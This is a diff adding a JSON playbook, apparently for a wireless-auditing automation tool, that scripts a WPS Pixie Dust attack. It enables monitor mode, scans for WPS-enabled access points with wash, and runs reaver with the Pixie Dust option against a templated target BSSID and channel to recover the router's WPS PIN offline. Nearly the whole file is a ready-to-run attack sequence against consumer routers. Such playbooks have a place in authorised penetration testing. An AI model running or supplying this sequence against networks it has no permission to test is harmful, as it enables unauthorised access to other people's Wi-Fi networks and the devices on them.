@@ -1,0 +1,46 @@
+{
+  "name": "wps_pixie",
+  "description": "WPS Pixie Dust attack: offline WPS pin recovery using reaver + pixiewps. Works on vulnerable routers without brute-force.",
+  "author": "james-linux",
+  "version": "1.0",
+  "requires_root": true,
+  "steps": [
+    {
+      "id": "check_kill",
+      "action": "aircrack.check_kill",
+      "description": "Kill interfering processes"
+    },
+    {
+      "id": "monitor_on",
+      "action": "aircrack.enable_monitor",
+      "params": {"interface": "{{interface}}"},
+      "description": "Enable monitor mode"
+    },
+    {
+      "id": "wps_scan",
+      "action": "layer.run",
+      "params": {
+        "command": "timeout 20 wash -i {{monitor_interface}} -s 2>/dev/null || echo 'wash scan complete'",
+        "timeout": 30,
+        "sudo": true
+      },
+      "description": "Scan for WPS-enabled access points using wash"
+    },
+    {
+      "id": "pixie_dust",
+      "action": "layer.run",
+      "params": {
+        "command": "reaver -i {{monitor_interface}} -b {{target_bssid}} -c {{target_channel}} -K 1 -vv",
+        "timeout": 120,
+        "sudo": true
+      },
+      "description": "Execute Pixie Dust attack (offline WPS pin recovery)"
+    },
+    {
+      "id": "monitor_off",
+      "action": "aircrack.disable_monitor",
+      "params": {"interface": "{{monitor_interface}}"},
+      "description": "Restore managed mode"
+    }
+  ]
+}
